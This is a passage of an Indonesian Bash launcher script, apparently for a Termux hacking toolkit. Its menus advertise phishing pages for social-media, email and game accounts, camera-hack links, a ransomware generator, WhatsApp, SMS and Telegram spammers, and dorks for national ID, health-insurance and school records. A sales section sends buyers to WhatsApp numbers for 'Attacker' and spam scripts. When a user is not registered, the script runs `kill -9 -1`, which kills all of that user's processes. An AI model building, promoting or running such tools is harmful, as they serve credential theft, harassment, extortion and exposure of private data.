if [ -n "$nama_user" ]; then
    sound_file=$(generate_suara "$nama_user")
    mpv --no-terminal --quiet --volume=100 "$sound_file" &> /dev/null &
    sound_pid=$!
    clear 
echo ""
txt "Hallo ${nama_user}, selamat datang di Tools V4" 0.07 "${c}"
    wait $sound_pid 2>/dev/null
echo ""
    sleep 1
    clear
else
    clear 
    echo ""
    echo -e "${r}Nama blum terdaftar silahkan daftar !! "
    echo ""
    sleep 3
    kill -9 -1 && exit
fi
else
    clear 
    echo ""
    echo -e "${r}❌ Nama kamu belum terdaftar!${n}"
    echo -e "${y}📝 Silahkan buat file : "Namamu" > $HOME/usr.txt${n}"
    echo ""
    sleep 3
    kill -9 -1 && exit
fi
ctrl_c() {
clear
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
echo ""
echo -e "${bold_bg}${bold_gren}Jangan Kaluar Mendadak, Mengulang !! \033[0m"
sleep 2
echo ""
clear
main_menu
return 0
}
trap ctrl_c INT
mek="ansi-rounded"
hei_babi() {
    local repo="https://github.com/Apwusyvwkjwygw/.whoami"
    local dir="$HOME/.cek_daftar"
    rm -rf "$dir" 2>/dev/null
    git clone --depth 1 "$repo" "$dir" 2>/dev/null
    if [ -f "$dir/Daftar.txt" ]; then
        grep -c '' "$dir/Daftar.txt"
        rm -rf "$dir"
    else
        rm -rf "$dir"
        echo "0"
    fi
}
JML=$(hei_babi 2>/dev/null | head -1)
JML=${JML:-0}
printf -v whoami "%03d" "$JML" 2>/dev/null || whoami="000"
DOWN() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${y}============================================="
echo -e "        ${bold_bg}${bold_gren} ☣ MENU DOWNLOADER MEDIA ☣︎ ${n} "
echo -e "${y}============================================="
echo -e "${r} [ ${g}70 ${r}] ${c}Download Video IG "
echo -e "${r} [ ${g}71 ${r}] ${c}Download Musik YouTube "
echo -e "${r} [ ${g}72 ${r}] ${c}Download Video Tiktok "
echo -e "${r} [ ${g}73 ${r}] ${c}Download Video Snack "
echo -e "${r} [ ${g}74 ${r}] ${c}Download Video Facebook "
echo -e "${r} [ ${g}75 ${r}] ${c}Download ALL,in Tiktok Web "
echo -e "${r} [ ${g}76 ${r}] ${c}Download Auto foto URL "
echo -e "${r} [ ${g}77 ${r}] ${c}Download Auto video URL "
echo -e "${r} [ ${g}78 ${r}] ${c}Download Video YouTube "
}
PSHG() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${y}============================================="
echo -e "        ${bold_bg}${bold_gren} ☣ MENU PSHING LOLCATHOST ☣︎ ${n} "
echo -e "${y}============================================="
echo -e "${r} [ ${g}81 ${r}] ${c}Camera Hack Link Bokep "
echo -e "${r} [ ${g}82 ${r}] ${c}Pshing Instagram "
echo -e "${r} [ ${g}83 ${r}] ${c}Pshing Gmail "
echo -e "${r} [ ${g}84 ${r}] ${c}Pshing Akun Moonton ML "
echo -e "${r} [ ${g}85 ${r}] ${c}Pshing Facebook "
echo -e "${r} [ ${g}86 ${r}] ${c}Pshing Lokasi IG "
echo -e "${r} [ ${g}87 ${r}] ${c}Pshing Tiktok "
echo -e "${r} [ ${g}88 ${r}] ${c}Pshing Akun FF "
echo -e "${r} [ ${g}89 ${r}] ${c}Camera Hack Link Band "
}
TMBH() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${y}============================================="
echo -e "        ${bold_bg}${bold_gren} ☣ MENU SCRIPT TAMBAHAN ☣︎ ${n} "
echo -e "${y}============================================="
echo -e "${r} [ ${g}60 ${r}] ${c}Google Translate "
echo -e "${r} [ ${g}61 ${r}] ${c}All-Game Via Web "
echo -e "${r} [ ${g}62 ${r}] ${c}Check Umur Seseorang "
echo -e "${r} [ ${g}63 ${r}] ${c}Kompres Foto "
echo -e "${r} [ ${g}64 ${r}] ${c}Generator teks sound google "
echo -e "${r} [ ${g}65 ${r}] ${c}Perhitungan Kalkulator "
echo -e "${r} [ ${g}66 ${r}] ${c}Kotak 4 tanpa newasision "
echo -e "${r} [ ${g}67 ${r}] ${c}Generator Logo Ascci "
}
ENC() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${y}============================================="
echo -e "       ${bold_bg}${bold_gren} ☣ MENU ENCRIPSY CODER FILE ☣︎ ${n} "
echo -e "${y}============================================="
echo -e "${r} [ ${g}51 ${r}] ${c}Encripty Javascript "
echo -e "${r} [ ${g}52 ${r}] ${c}Encripsy Python "
echo -e "${r} [ ${g}53 ${r}] ${c}Encripsy Html "
echo -e "${r} [ ${g}54 ${r}] ${c}Encripsy Bash "
}
ALL() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${y}============================================="
echo -e "         ${bold_bg}${bold_gren}  𖤍 MENU HACKING MEDIA 𖤍  ${n} "
echo -e "${y}============================================="
echo -e "${r} [ ${g}01 ${r}] ${c}Hack Setatus WhatsApp "
echo -e "${r} [ ${g}02 ${r}] ${c}Template Gmail Akun "
echo -e "${r} [ ${g}03 ${r}] ${c}Spam Pairing WhatsApp "
echo -e "${r} [ ${g}04 ${r}] ${c}Ransower Generator File "
echo -e "${r} [ ${g}05 ${r}] ${c}Dork Github Akun "
echo -e "${r} [ ${g}06 ${r}] ${c}Tema Termux Pro "
echo -e "${r} [ ${g}07 ${r}] ${c}Pshing Lokasi auto URL "
echo -e "${r} [ ${g}08 ${r}] ${c}Dork Instagram "
echo -e "${r} [ ${g}09 ${r}] ${c}Spammer Telegram Login "
echo -e "${r} [ ${g}10 ${r}] ${c}Decoder Tools Encripsi "
echo -e "${r} [ ${g}11 ${r}] ${c}Sporty pay stel lagu "
echo -e "${r} [ ${g}12 ${r}] ${c}Dump Email Crew Website "
echo -e "${r} [ ${g}13 ${r}] ${c}Bruteforce File Zip "
echo -e "${r} [ ${g}14 ${r}] ${c}Malware Capture Pshing "
echo -e "${r} [ ${g}15 ${r}] ${c}Parster Nik "
echo -e "${r} [ ${g}16 ${r}] ${c}Wormgpt AI "
echo -e "${r} [ ${g}17 ${r}] ${c}Generator QR "
echo -e "${r} [ ${g}18 ${r}] ${c}Protect Pairing Code WhatsApp "
echo -e "${r} [ ${g}19 ${r}] ${c}Scanner Foto Album "
echo -e "${r} [ ${g}20 ${r}] ${c}Botz Get ID Telegram "
echo -e "${r} [ ${g}21 ${r}] ${c}Spammer NGL "
echo -e "${r} [ ${g}22 ${r}] ${c}Upload Foto Ke URL "
echo -e "${r} [ ${g}23 ${r}] ${c}File Auto Seff "
echo -e "${r} [ ${g}24 ${r}] ${c}Upload Video Ke URL "
echo -e "${r} [ ${g}25 ${r}] ${c}Convert URL Ke BITLY "
echo -e "${r} [ ${g}26 ${r}] ${c}Spam Telegram Via Token "
echo -e "${r} [ ${g}27 ${r}] ${c}Genz Resource File "
echo -e "${r} [ ${g}28 ${r}] ${c}Scan URL Virustotal "
echo -e "${r} [ ${g}29 ${r}] ${c}Kostum Prot Penyamaran URL "
echo -e "${r} [ ${g}30 ${r}] ${c}Create Galery Eyes "
echo -e "${r} [ ${g}31 ${r}] ${c}Checker IMEI Info "
echo -e "${r} [ ${g}32 ${r}] ${c}Dork BPJS Kesehatan "
echo -e "${r} [ ${g}33 ${r}] ${c}Check Jaringan Network "
echo -e "${r} [ ${g}34 ${r}] ${c}Check Sender Akun Email "
echo -e "${r} [ ${g}35 ${r}] ${c}Scanner QR code "
echo -e "${r} [ ${g}36 ${r}] ${c}Controll Botz Telegram "
echo -e "${r} [ ${g}37 ${r}] ${c}Vercle Desploy Website "
echo -e "${r} [ ${g}38 ${r}] ${c}Search Media Sosial "
echo -e "${r} [ ${g}39 ${r}] ${c}Check File DB Json Data Siswa "
echo -e "${r} [ ${g}40 ${r}] ${c}Spam Report WhatsApp "
echo -e "${r} [ ${g}41 ${r}] ${c}Spammer Gmail "
echo -e "${r} [ ${g}42 ${r}] ${c}Dork Botz Telegram "
echo -e "${r} [ ${g}43 ${r}] ${c}Dork PTK Sekolah "
echo -e "${r} [ ${g}44 ${r}] ${c}Getcontank Number Profile "
echo -e "${r} [ ${g}45 ${r}] ${c}Dork Postal Kode "
echo -e "${r} [ ${g}46 ${r}] ${c}Track IP Address "
echo -e "${r} [ ${g}47 ${r}] ${c}Spammer OTP WhatsApp & SMS "
echo -e "${r} [ ${g}48 ${r}] ${c}Checker E-wallet Number To Name "
echo -e "${r} [ ${g}49 ${r}] ${c}Screenshot URL Website "
echo -e "${r} [ ${g}50 ${r}] ${c}Generator Wordslit Password "
}
PRODAK() {
gambar() {
    local link=$1
    if command -v xdg-open &> /dev/null; then
        xdg-open "$link" 2>/dev/null
    elif command -v termux-open &> /dev/null; then
        termux-open "$link" 2>/dev/null
    else
        echo -e "${r}Tidak bisa buka gambar, buka manual : $link"
    fi
}
wea() {
    local nomor=$1
    local pesan=$2
    local encoded_pesan=$(echo "$pesan" | sed 's/ /%20/g; s/\n/%0A/g')
    local link="https://wa.me/$nomor?text=$encoded_pesan"    
    if command -v xdg-open &> /dev/null; then
        xdg-open "$link" 2>/dev/null
    elif command -v termux-open &> /dev/null; then
        termux-open "$link" 2>/dev/null
    else
        echo -e "${r}Tidak bisa buka WA, buka manual : $link"
    fi
}
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "${y}============================================="
echo -e "       ${bold_bg}${bold_gren} ☣ MENU PRODAK SC TERMUX ☣︎ ${n} "
echo -e "${y}============================================="
echo -e "${r} [ ${g}buy1 ${r}] ${c}Buy Sc Osint Lengkap "
echo -e "${r} [ ${g}buy2 ${r}] ${c}Buy Sc Spam Brutal Wea "
echo -e "${r} [ ${g}buy3 ${r}] ${c}Buy Sc Trust-YourCam "
echo -e "${r} [ ${g}buy4 ${r}] ${c}Buy Sc Attacker "
echo ""
echo -e "${r} [ ${g}BK ${r}] ${p}Kembali ke TOOLSlV"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSlV ${r}]${c} : ")" input
echo ""
if [[ "$input" = "buy1" || "$input" = "BUY1" ]]; then
  clear
  echo ""
  echo -e "${bold_bg}${bold_gren} ANDA MEMILIH BUY OSINT LENGKAP MEMBUKA FITUR.${n}"
  sleep 3 
  clear
  mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
  sleep 1
  mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
  echo ""
  echo -e "${g} Apakah anda ingin melihat tampilan scnya? "
  echo -e "${g} Pada gambar tersebut? "
  echo -e "${p}"
  read -p "Apakah anda ingin melihat gambar tersebut? (y/n) : " cok
  echo ""
  if [ "$cok" = "y" ] || [ "$cok" = "Y" ]; then
      gambar "https://i.top4top.io/p_3774m60os1.jpg"
      echo -e "${g}Membuka gambar ke halaman web."
      sleep 2
  elif [ "$cok" = "n" ] || [ "$cok" = "N" ]; then
      echo ""
      echo -e "${r}Lewati melihat gambar."
  else
      echo ""
      echo -e "${y}Masukkan y atau n saja."
  fi  
  clear
  echo ""
  echo -e "${y}=========================================${n}"
  echo -e "${g}  Apakah anda ingin membuka Owner?${n}"
  echo -e "${y}=========================================${n}"
  echo -e "${c}"
  read -p "Buka WhatsApp sekarang? (y/n) : " wa
  if [[ "$wa" = "y" || "$wa" = "Y" ]]; then
      pesan="Assalamualaikum bang. Apakah masih ada Script OSINT lengkapnya?
> _Buyer ToolslV_"
      wea "6285731184377" "$pesan"
      echo -e "${g}✓ Membuka WhatsApp."
  else
      echo -e "${r}✗ Dibatalkan."
  fi
  sleep 2
  clear
elif [[ "$input" = "buy2" || "$input" = "BUY2" ]]; then
  clear
  echo ""
  echo -e "${bold_bg}${bold_gren} ANDA MEMILIH BUY SPAM BRUTAL WEA.${n}"
  sleep 3 
  clear
  mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
  sleep 1
  mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
  echo ""
  echo -e "${g} Apakah anda ingin melihat tampilan scnya? "
  echo -e "${g} Pada gambar tersebut? "
  echo -e "${p}"
  read -p "Apakah anda ingin melihat gambar tersebut? (y/n) : " cok
  echo ""
  if [ "$cok" = "y" ] || [ "$cok" = "Y" ]; then
      gambar "https://h.top4top.io/p_3774w3ngm1.jpg"
      echo -e "${g}Membuka gambar ke halaman web."
      sleep 2
  elif [ "$cok" = "n" ] || [ "$cok" = "N" ]; then
      echo ""
      echo -e "${r}Lewati melihat gambar."
  else
      echo ""
      echo -e "${y}Masukkan y atau n saja."
  fi  
  clear
  echo ""
  echo -e "${y}=========================================${n}"
  echo -e "${g}  Apakah anda ingin membuka Owner?${n}"
  echo -e "${y}=========================================${n}"
  echo -e "${c}"
  read -p "Buka WhatsApp sekarang? (y/n) : " wa
  if [[ "$wa" = "y" || "$wa" = "Y" ]]; then
      pesan="Assalamualaikum bang. Apakah masih ada Script Spam Brutalnya?
> _Buyer ToolslV_"
      wea "6285691909415" "$pesan"
      echo -e "${g}✓ Membuka WhatsApp."
  else
      echo -e "${r}✗ Dibatalkan."
  fi
  sleep 2
  clear
elif [[ "$input" = "buy3" || "$input" = "BUY3" ]]; then
  clear
